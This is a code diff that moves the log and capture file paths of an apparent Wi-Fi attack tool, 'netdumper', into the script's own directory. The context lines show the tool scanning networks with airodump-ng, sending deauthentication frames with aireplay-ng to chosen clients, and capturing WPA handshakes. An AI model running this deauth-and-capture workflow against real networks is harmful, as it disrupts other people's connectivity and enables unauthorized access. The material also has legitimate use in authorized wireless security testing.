@@ -7,6 +7,8 @@ import shutil
 import re
 import logging
 
+LOCAL_DIR = os.path.dirname(os.path.abspath(__file__))
+
 GREEN = "\033[92m"
 RED = "\033[91m"
 PINK = "\033[35m"
@@ -17,7 +19,7 @@ logging.basicConfig(
     level=logging.INFO,
     format='\033[0m%(asctime)s - [%(levelname)s] - %(message)s',
     handlers=[
-        logging.FileHandler("netdumper.log"),
+        logging.FileHandler(os.path.join(LOCAL_DIR, "netdumper.log")),
         logging.StreamHandler()
     ]
 )
@@ -170,7 +172,9 @@ def start(interfaces):
             f"{PINK}Starting Temporary Scan With airodump-ng "
             f"On The Board: {RESET}{CYAN}{monitor_wnic}..."
         )
-        cap_prefix = "airodump_temp"
+
+        cap_prefix = os.path.join(LOCAL_DIR, "airodump")
+
         try:
             subprocess.run(
                 f"airodump-ng --output-format csv -w {cap_prefix} {monitor_wnic}",
@@ -184,8 +188,9 @@ def start(interfaces):
 
         time.sleep(2)
         csv_file = f"{cap_prefix}-01.csv"
+
         if os.path.exists(csv_file):
-            shutil.copy(csv_file, "airodump.txt")
+            shutil.copy(csv_file, os.path.join(LOCAL_DIR, "airodump.txt"))
             logging.info(f"{GREEN}Monitoring Data Successfully Saved To 'airodump.txt'.")
         else:
             logging.warning(
@@ -196,7 +201,7 @@ def start(interfaces):
 
         logging.info(f"{PINK}Parsing 'airodump.txt' To Identify Targets BSSID And Clients...")
         targets = []
-        with open("airodump.txt", "r", encoding="utf-8", errors="ignore") as f:
+        with open(os.path.join(LOCAL_DIR, "airodump.txt"), "r", encoding="utf-8", errors="ignore") as f:
             lns = f.readlines()
 
         reading_clients = False
@@ -244,11 +249,12 @@ def start(interfaces):
             logging.info(
                 f"{PINK}Deauthenticating ->{RESET} {CYAN}aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_wnic}"
             )
+
             run_command(
                 f"aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_wnic}"
             )
 
-            cap_file = f"package_{idx}"
+            cap_file = os.path.join(LOCAL_DIR, f"package_{idx}")
             logging.info(
                 f"{PINK}Starting Dynamic Capture for Handshake: {RESET}{CYAN}{cap_file}.cap on Channel {channel}..."
             )
